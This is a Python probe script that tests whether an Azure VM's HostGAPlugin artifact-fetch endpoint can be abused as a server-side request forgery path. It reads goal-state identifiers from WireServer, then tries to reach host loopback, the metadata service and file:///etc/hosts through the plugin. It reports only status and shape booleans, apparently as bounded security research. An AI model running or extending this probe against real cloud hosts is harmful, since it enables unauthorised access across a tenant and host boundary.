#!/usr/bin/env python3
"""Bounded Meta LHE classifier for the Azure HostGAPlugin fetch boundary.

No response body, URL credential, container ID, role configuration name, or
exception text is emitted.  The probe compares only body digests in memory and
prints status/shape booleans for five fixed, non-mutating GET targets.
"""

from __future__ import annotations

import hashlib
import http.client
import json
import ssl
import urllib.error
import urllib.request
import xml.etree.ElementTree as ET
from typing import Any


PREFIX = "META_LHE_FAIRCHEM_HOSTGAPLUGIN"
WIRE_HOST = "168.63.129.16"
HOST_PLUGIN_PORT = 32526
TIMEOUT_SECONDS = 8
MAX_BODY = 1024 * 1024
GOAL_STATE_PATH = "/machine?comp=goalstate"
PUBLIC_CONTROL = (
    "https://raw.githubusercontent.com/facebookresearch/fairchem/"
    "d733f489c2e9257f92545e9b20af916a8fea2a8a/LICENSE.md"
)
FIXED_TARGETS = {
    "public_https_control": PUBLIC_CONTROL,
    "host_loopback_plugin_versions": "http://127.0.0.1:32526/versions",
    "azure_imds_instance_without_metadata_header": (
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
    ),
    "azure_wireserver_current_goal_state": (
        "http://168.63.129.16/machine?comp=goalstate"
    ),
    "host_file_scheme_control": "file:///etc/hosts",
}


def body_bucket(length: int) -> str:
    if length == 0:
        return "0"
    if length < 256:
        return "1-255"
    if length < 4096:
        return "256-4095"
    if length < 65536:
        return "4096-65535"
    if length <= MAX_BODY:
        return "65536-1048576"
    return "over-limit"


def read_bounded(response: http.client.HTTPResponse) -> tuple[bytes, bool]:
    data = response.read(MAX_BODY + 1)
    return data[:MAX_BODY], len(data) > MAX_BODY


def http_get(
    host: str,
    port: int,
    path: str,
    headers: dict[str, str] | None = None,
) -> dict[str, Any]:
    connection = http.client.HTTPConnection(host, port, timeout=TIMEOUT_SECONDS)
    try:
        connection.request("GET", path, headers=headers or {})
        response = connection.getresponse()
        data, truncated = read_bounded(response)
        return {
            "ok": True,
            "status": response.status,
            "content_type": response.getheader("content-type", ""),
            "data": data,
            "truncated": truncated,
        }
    except (OSError, http.client.HTTPException) as exc:
        return {"ok": False, "error_class": type(exc).__name__, "data": b""}
    finally:
        connection.close()


def direct_https(url: str) -> dict[str, Any]:
    opener = urllib.request.build_opener(
        urllib.request.ProxyHandler({}),
        urllib.request.HTTPSHandler(context=ssl.create_default_context()),
    )
    try:
        with opener.open(url, timeout=TIMEOUT_SECONDS) as response:
            data = response.read(MAX_BODY + 1)
            return {
                "ok": True,
                "status": response.status,
                "data": data[:MAX_BODY],
                "truncated": len(data) > MAX_BODY,
            }
    except (OSError, urllib.error.URLError) as exc:
        return {"ok": False, "error_class": type(exc).__name__, "data": b""}


def body_shape(data: bytes, content_type: str = "") -> dict[str, Any]:
    lowered = data.lower()
    json_valid = False
    xml_valid = False
    try:
        json.loads(data)
        json_valid = True
    except (json.JSONDecodeError, UnicodeDecodeError):
        pass
    try:
        ET.fromstring(data)
        xml_valid = True
    except (ET.ParseError, ValueError):
        pass
    markers = {
        "invalid_uri": b"invaliduri" in lowered or b"invalid uri" in lowered,
        "unsupported_scheme": (
            b"unsupported scheme" in lowered or b"scheme is not supported" in lowered
        ),
        "forbidden": b"forbidden" in lowered or b"not authorized" in lowered,
        "blocked": b"blocked" in lowered or b"not allowed" in lowered,
        "metadata_header_required": (
            b"metadata" in lowered and b"required" in lowered
        ),
        "connection_failure": (
            b"connection refused" in lowered
            or b"name or service not known" in lowered
            or b"timed out" in lowered
        ),
    }
    media_class = "other"
    normalized_type = content_type.lower()
    if "json" in normalized_type:
        media_class = "json"
    elif "xml" in normalized_type:
        media_class = "xml"
    elif normalized_type.startswith("text/"):
        media_class = "text"
    elif normalized_type:
        media_class = "binary"
    return {
        "body_nonempty": bool(data),
        "body_length_bucket": body_bucket(len(data)),
        "json_valid": json_valid,
        "xml_valid": xml_valid,
        "media_class": media_class,
        "policy_or_backend_markers": markers,
        "raw_body_emitted": False,
    }


def public_result(value: dict[str, Any]) -> dict[str, Any]:
    if not value.get("ok"):
        return {
            "request_completed": False,
            "error_class": value.get("error_class", "UnknownError"),
            "raw_error_emitted": False,
        }
    return {
        "request_completed": True,
        "status": value["status"],
        "truncated": value.get("truncated", False),
        **body_shape(value["data"], value.get("content_type", "")),
    }


def get_goal_state() -> tuple[dict[str, Any], str, str, bytes]:
    result = http_get(
        WIRE_HOST,
        80,
        GOAL_STATE_PATH,
        {"x-ms-version": "2012-11-30"},
    )
    if not result.get("ok") or result.get("status") != 200:
        raise RuntimeError("goal state request unavailable")
    root = ET.fromstring(result["data"])
    container_id = root.findtext(".//ContainerId") or ""
    config_name = root.findtext(".//ConfigName") or ""
    if not container_id or not config_name:
        raise RuntimeError("goal state identifiers unavailable")
    return public_result(result), container_id, config_name, result["data"]


def fetch_artifact(container_id: str, config_name: str, target: str) -> dict[str, Any]:
    return http_get(
        WIRE_HOST,
        HOST_PLUGIN_PORT,
        "/extensionArtifact",
        {
            "x-ms-version": "2015-09-01",
            "x-ms-containerid": container_id,
            "x-ms-host-config-name": config_name,
            "x-ms-artifact-location": target,
        },
    )


def same_body(left: dict[str, Any], right: dict[str, Any]) -> bool:
    if not left.get("ok") or not right.get("ok"):
        return False
    if left.get("status") != right.get("status"):
        return False
    left_body = left.get("data", b"")
    right_body = right.get("data", b"")
    return bool(left_body) and hashlib.sha256(left_body).digest() == hashlib.sha256(
        right_body
    ).digest()


def main() -> int:
    try:
        goal_public, container_id, config_name, goal_body = get_goal_state()
    except (RuntimeError, ET.ParseError, OSError) as exc:
        print(
            f"{PREFIX}_json="
            + json.dumps(
                {
                    "schema": "meta-lhe-fairchem-hostgaplugin-boundary-v1",
                    "supported": False,
                    "error_class": type(exc).__name__,
                    "raw_error_emitted": False,
                },
                sort_keys=True,
                separators=(",", ":"),
            )
        )
        return 0

    versions = http_get(
        WIRE_HOST,
        HOST_PLUGIN_PORT,
        "/versions",
        {"x-ms-containerid": container_id},
    )
    direct_public = direct_https(PUBLIC_CONTROL)
    direct_imds = http_get(
        "169.254.169.254",
        80,
        "/metadata/instance?api-version=2021-02-01",
    )
    fetched = {
        name: fetch_artifact(container_id, config_name, target)
        for name, target in FIXED_TARGETS.items()
    }

    classified = {name: public_result(value) for name, value in fetched.items()}
    public_match = same_body(fetched["public_https_control"], direct_public)
    loopback_match = same_body(fetched["host_loopback_plugin_versions"], versions)
    imds_match = same_body(
        fetched["azure_imds_instance_without_metadata_header"], direct_imds
    )
    wireserver_match = bool(
        fetched["azure_wireserver_current_goal_state"].get("ok")
        and fetched["azure_wireserver_current_goal_state"].get("data")
        and hashlib.sha256(
            fetched["azure_wireserver_current_goal_state"]["data"]
        ).digest()
        == hashlib.sha256(goal_body).digest()
    )

    result = {
        "schema": "meta-lhe-fairchem-hostgaplugin-boundary-v1",
        "scope": "five fixed non-mutating GET targets via current VM HostGAPlugin",
        "supported": True,
        "goal_state": goal_public,
        "goal_state_identifiers_present": True,
        "goal_state_identifiers_emitted": False,
        "host_plugin_versions": public_result(versions),
        "targets": classified,
        "comparisons": {
            "public_control_matches_direct_guest_fetch": public_match,
            "loopback_control_matches_host_plugin_versions": loopback_match,
            "imds_without_metadata_header_matches_direct_guest_response": imds_match,
            "wireserver_response_matches_current_vm_goal_state": wireserver_match,
        },
        "conclusions": {
            "host_side_public_fetch_confirmed": public_match,
            "host_loopback_fetch_confirmed": loopback_match,
            "azure_imds_content_fetch_confirmed": imds_match,
            "current_vm_wireserver_fetch_confirmed": wireserver_match,
            "host_file_read_confirmed": (
                fetched["host_file_scheme_control"].get("status") == 200
                and bool(fetched["host_file_scheme_control"].get("data"))
            ),
        },
        "requests_sent": 9,
        "methods": ["GET"],
        "network_scan_performed": False,
        "response_bodies_emitted": False,
        "credentials_emitted": False,
        "external_state_changed": False,
    }
    print(f"{PREFIX}_json={json.dumps(result, sort_keys=True, separators=(',', ':'))}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
